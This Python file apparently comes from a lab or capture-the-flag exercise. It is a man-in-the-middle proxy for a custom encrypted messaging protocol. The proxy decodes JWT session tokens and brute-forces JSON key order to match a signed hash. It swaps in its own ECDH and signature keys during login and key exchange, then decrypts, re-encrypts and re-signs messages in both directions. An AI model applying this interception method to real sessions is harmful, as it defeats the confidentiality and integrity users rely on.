import base64
import socket
from intercept_server import *
import itertools
import json
import hashlib

def sha256_int(s: str):
    return bytes_to_long(hashlib.sha256(s.encode("utf-8")).digest())

def brute_force_dict_order(data:dict, target_hash_value:int):
    keys = list(data.keys())

    for perm in itertools.permutations(keys):
        # Build JSON string EXACTLY like JSONObject.toString()
        items = []
        for k in perm:
            v = data[k]
            if isinstance(v, str):
                items.append(f"\"{k}\":\"{v}\"")
            else:
                items.append(f"\"{k}\":{v}")

        json_string = "{" + ",".join(items) + "}"
        digest = sha256_int(json_string)

        if digest == target_hash_value:
            print("MATCH FOUND")
            print("Order:", perm)
            print("JSON :", json_string)
            print("HASH :", digest)
            return json_string

    print("No match found")
    return None


HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65431    # Port to listen on (non-privileged ports are > 1023)

# This class/function manages the socket connection and buffers data
class SocketReader:
    def __init__(self, sock):
        self.sock = sock
        # Initialize a buffer for incoming bytes
        self.buffer = b'' 
        
    def read_until(self, delimiter=b'\n', chunk_size=1024):
        """
        Reads from the socket until the delimiter is found.
        Returns the data *before* the delimiter.
        """
        while True:
            # 1. Check if the delimiter is already in the buffer
            index = self.buffer.find(delimiter)
            
            if index != -1:
                # Delimiter found!
                # Extract the message (up to the delimiter)
                message = self.buffer[:index]
                
                # Update the buffer to start *after* the delimiter
                self.buffer = self.buffer[index + len(delimiter):]
                return message
            
            # 2. If not found, read more data from the socket
            try:
                # Use b'' for Python 3, '' for Python 2 (though b'' works
                # in Py2 if you treat strings as byte-strings)
                chunk = self.sock.recv(chunk_size) 
            except socket.error as e:
                # Handle socket error (e.g., connection reset)
                raise Exception("Socket error during read: %s" % e)

            if not chunk:
                # EOF reached (connection closed)
                if self.buffer:
                    # Return any remaining data before closing
                    remaining = self.buffer
                    self.buffer = b''
                    return remaining
                # Nothing left to read
                return None 

            # Add the new chunk to the buffer
            self.buffer += chunk



def extract_jwt(token:str):
    try:
        # 1. Split the token
        header_b64, body_b64, sig_b64 = token.split('.')

        # 2. Define a helper to fix padding
        # JWTs strip padding, so we must add '=' until length % 4 == 0
        def fix_padding(segment):
            return segment + '=' * (-len(segment) % 4)

        # 3. Decode using urlsafe_b64decode
        # We process header and body. Signature is usually kept as bytes or hex.
        header_bytes = base64.urlsafe_b64decode(fix_padding(header_b64))
        body_bytes = base64.urlsafe_b64decode(fix_padding(body_b64))
        sig_bytes = base64.urlsafe_b64decode(fix_padding(sig_b64))

        print("Decoded base64 for jwt!")

        # 4. Parse JSON
        header_dict = json.loads(header_bytes.decode('utf-8'))
        body_dict = json.loads(body_bytes.decode('utf-8'))

        return header_dict, body_dict, sig_bytes

    except Exception as e:
        print(f"Failed to decode JWT: {e}")
        return None, None, None

class MITM:
    def __init__(self, client:Client, server:Server):
        self.client = client
        self.server = server

    def process_server_login(self, json_data:dict):
        print("Processing server login!")
        # print("json_data=", json_data)
        print("json_data type", type(json_data))
        session_token = json_data["sessionToken"]
        _, body, _ = extract_jwt(session_token)
        print("Extracted jwt body: ", body)
        sid = body.get("sid")
        algorithm = body.get("algorithm")
        sub = body.get("sub")
        createdAt = body.get("createdAt")
        
        old_session_sig = json_data["sessionSignature"]
        message_hash = int(old_session_sig["messageHash"])
        
        session = {
            "sessionId": sid,
            "algorithm": algorithm,
            "userId": sub,
            "createdAt": int(createdAt)
        }
        valid_order_session = brute_force_dict_order(session, message_hash)
        if valid_order_session:
            session = valid_order_session
        # Try to verify hash
        hashed = hashlib.sha256(session.encode())
        session_hashed = bytes_to_long(hashed.digest())
        print("Session hashed value: ", session_hashed)
        if message_hash == session_hashed:
            print("Ok same hashes")
        else:
            print("WARNING: different hash")
        
        # Initialize the server with custom session
        # then re-sign them with your custom public key and session key
        print("Calculating new keys")
        _, pubkey_xy, ephe_xy, session_sig = self.server.get_login_session(custom_session_data=session)
        
        
        try:
            G = CLIENT_ECDH.generator
            P = PointEC(CLIENT_ECDH.curve, *ephe_xy)
            verified = ecdsa_verify(session, G, P, session_sig[0], session_sig[1])
            if not verified:
                raise Exception("Unverified! Check your server reimplementation")
        except Exception as e:
            print("WARNING when reverify generated keys: ", e)
        # Save real server pubkey to fake client, before we replace them
        real_server_pubkey_x = int(json_data["serverPublicKey"]["x"])
        real_server_pubkey_y = int(json_data["serverPublicKey"]["y"])
        self.client.server_pubkey = PointEC(self.client.ecdh.curve, real_server_pubkey_x, real_server_pubkey_y)
        
        # replace keys
        print("Replacing keys")
        json_data["serverSignaturePublicKey"] = {
            "x": str(ephe_xy[0]),
            "y": str(ephe_xy[1])
        }
        json_data["serverPublicKey"] = {
            "x": str(pubkey_xy[0]),
            "y": str(pubkey_xy[1])
        }
        
        json_data["sessionSignature"] = {
            "r": str(session_sig[0]),
            "s": str(session_sig[1]),
            "messageHash": old_session_sig["messageHash"],
            "algorithm": old_session_sig["algorithm"]
        }
        return "success:" + json.dumps(json_data)

    def process_client_exchange(self, json_data:dict):
        # The main part of this code is to verify 
        print("Processing client exchange!")
        print("json_data type", type(json_data))
        client_pubkey = json_data["clientPublicKey"]
        client_rs = json_data["clientPublicKeySignature"]
        client_ephe_pubkey = json_data["clientSignaturePublicKey"]
        
        print("Extracting client stuffs")
        clipub_xy = ( int(client_pubkey["x"]) , int(client_pubkey["y"]) )
        clisig_rs = ( int(client_rs["r"]) , int(client_rs["s"]) )
        cli_ephepub_xy= (int(client_ephe_pubkey["x"]), int(client_ephe_pubkey["y"]))

        print("Passing to server for verification")
        status = self.server.do_key_exchange(clipub_xy, clisig_rs, cli_ephepub_xy)
        if status != "success":
            return "error:{}"
        # Now we set up a fake client
        print("Setting up fake client")
        fake_clipub_xy, fake_clisig_rs, fake_cli_ephepub_xy = self.client.key_exchange()
        
        print("Replacing keys")
        json_data["clientPublicKey"] = {
            "x":str(fake_clipub_xy[0]),
            "y":str(fake_clipub_xy[1])
        }
        # computing message hash
        msg = dict_to_str_nowhitespace(json_data["clientPublicKey"])
        hashed = hashlib.sha256(msg.encode())
        msgHash_value = bytes_to_long(hashed.digest())
        
        json_data["clientPublicKeySignature"] = {
            "r":str(fake_clisig_rs[0]),
            "s":str(fake_clisig_rs[1]),
            "messageHash":str(msgHash_value),
            "algorithm":client_rs["algorithm"]
        }
        json_data["clientSignaturePublicKey"] = {
            "x":str(fake_cli_ephepub_xy[0]),
            "y":str(fake_cli_ephepub_xy[1])
        }
        
        return "success:" + json.dumps(json_data)

    def process_server_exchange(self, json_data:dict):
        print("Processing server exchange!")
        print("json_data type", type(json_data))
        
        # Here we just need to confirm that session id is unchanged
        return "Aok!"

    def process_client_msg(self, json_data: dict):
        print("Processing client mesage!")
        print("json_data type", type(json_data))
        
        encrypted_msg = json_data["encryptedMessage"]
        message_sig = json_data["messageSignature"]
        client_ephe_pubkey = json_data["clientSignaturePublicKey"]
        
        # Decrypt the message
        print("Message decrypting...")
        block = base64.b64decode(encrypted_msg)
        iv = block[:12] # iv is 12-bytes long
        ciphertext = block[12:-16]
        tags = block[-16:]
        
        cliephe_pubkey_x = int(client_ephe_pubkey["x"])
        cliephe_pubkey_y = int(client_ephe_pubkey["y"])
        
        r = int(message_sig["r"])
        s = int(message_sig["s"])
        
        print("Passing to server to read it")
        plaintext = self.server.receive_msg(
            iv, ciphertext, tags,
            (cliephe_pubkey_x, cliephe_pubkey_y),
            (r, s)
        )
        
        # Re-encrypt it with our fake-client
        print("Passing to client to re-sign it")
        new_iv, new_encrypted, new_tags, new_ephepub_xy, new_rs = self.client.send_msg(plaintext)
        # Replacing values
        print("Replacing key values in requests")
        new_encrypted_msg = to_paddless_base64(new_iv + new_encrypted + new_tags)
        # Debug: show exact message string and its SHA256 integer
        try:
            print("MITM NEW msg repr:", repr(new_encrypted_msg))
            print("MITM NEW sha256 int:", bytes_to_long(hashlib.sha256(new_encrypted_msg.encode()).digest()))
        except Exception as _:
            print("MITM NEW: failed to compute debug hash")
        # print(f"Encrypt message value: {new_iv=} {new_encrypted=} {tag=}")
        json_data["encryptedMessage"] = new_encrypted_msg
        
        # Try to reverify:
        # try:
        #     P = PointEC(CLIENT_ECDH.curve, *new_ephepub_xy)
        #     if not ecdsa_verify(new_encrypted_msg, CLIENT_ECDH.generator, P, *new_rs):
        #         raise ValueError("Failed verification")
        # except Exception as e:
        #     print("WARNING: Fail re-verification!", e)
        
        # recompute hash value
        hashed = hashlib.sha256(new_encrypted_msg.encode())
        msg_hash_value = bytes_to_long(hashed.digest())
        
        json_data["messageSignature"] = {
            "r": str(new_rs[0]),
            "s": str(new_rs[1]),
            "messageHash":str(msg_hash_value),
            "algorithm": message_sig["algorithm"]
        }
        json_data["clientSignaturePublicKey"] = {
            "x":str(new_ephepub_xy[0]),
            "y":str(new_ephepub_xy[1])
        }
        return "success:" + json.dumps(json_data)

    def process_server_msg(self, json_data: dict):
        print("Processing server reply!")
        print("json_data type", type(json_data))
        
        encrypted_msg = json_data["encryptedResponse"]
        message_sig = json_data["responseSignature"]
        server_ephe_pubkey = json_data["serverSignaturePublicKey"]
        
        # Decrypt the message
        print("Message decrypting...")
        block = base64.b64decode(encrypted_msg)
        iv = block[:12] # iv is 12-bytes long
        ciphertext = block[12:-16]
        tags = block[-16:]
        
        server_ephepub_x = int(server_ephe_pubkey["x"])
        server_ephepub_y = int(server_ephe_pubkey["y"])
        
        r = int(message_sig["r"])
        s = int(message_sig["s"])
        
        print("Passing to client to read it")
        plaintext = self.client.receive_msg(
            ciphertext, iv, tags,
            (server_ephepub_x, server_ephepub_y),
            (r, s)
        )
        
        print("Passing to server to re-sign it")
        new_iv, new_encrypted, new_tags, new_ephepub_xy, new_rs = self.server.send_msg(plaintext)
        
        # Try to decrypt it
        
        # Replacing values
        print("Replacing key values in responses")
        new_encrypted_msg = to_paddless_base64(new_iv + new_encrypted + new_tags)
        # re-compute hashed values
        hashed = hashlib.sha256(new_encrypted_msg.encode())
        msg_hash_value = bytes_to_long(hashed.digest())
        
        json_data["encryptedResponse"] = new_encrypted_msg
        json_data["responseSignature"] = {
            "r": str(new_rs[0]),
            "s": str(new_rs[1]),
            "messageHash": msg_hash_value,
            "algorithm": message_sig["algorithm"]
        }
        json_data["serverSignaturePublicKey"] = {
            "x":str(new_ephepub_xy[0]),
            "y":str(new_ephepub_xy[1])
        }
        return "success:" + json.dumps(json_data)

    def process_data(self, data):
        try:
            decoded = data.decode('utf-8')
            print(f"Server received: {decoded}")
            # Process data here
            
            header, json_data_str = decoded.split(':', 1)
            json_data_dict = json.loads(json_data_str)
            print("Header received: ",header)        
            if header == "Login server":
                # extract login session
                final_msg = self.process_server_login(json_data_dict)
            
            elif header == "Exchange client":
                final_msg = self.process_client_exchange(json_data_dict)
            
            elif header == "Exchange server":
                final_msg = self.process_server_exchange(json_data_dict)
                
            elif header == "Msg client":
                final_msg = self.process_client_msg(json_data_dict)
                
            elif header == "Msg server":
                final_msg = self.process_server_msg(json_data_dict)
                
            else:
                final_msg = "AOK, but dunno what to do!"
            
            
            return (final_msg + '\n').encode()
        
        except Exception as e:
            print(f"Processing error: {e}")
            return b"error:Error processing data\n"

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Good practice: allows restart immediately
        s.bind((HOST, PORT))
        s.listen()
        print(f"Python 3 server listening on {HOST}:{PORT}...")
        # Setting up server instance
        client = Client()
        server = Server()
        mitm = MITM(client, server)

        # --- FIX: Main Loop to keep server alive ---
        while True: 
            try:
                conn, addr = s.accept()
                with conn:
                    print(f"Connected by {addr}")
                    reader = SocketReader(conn)
                    
                    # Keep reading messages from this specific client until they disconnect
                    while True:
                        data = reader.read_until()
                        
                        if not data:
                            break # Client disconnected
                        
                        response = mitm.process_data(data)
                        print("Sending response: ", response)
                        conn.sendall(response)
                        
            except KeyboardInterrupt:
                # Allow you to stop the server with Ctrl+C
                break
            except Exception as e:
                print(f"Connection error: {e}")

if __name__ == "__main__":
    main()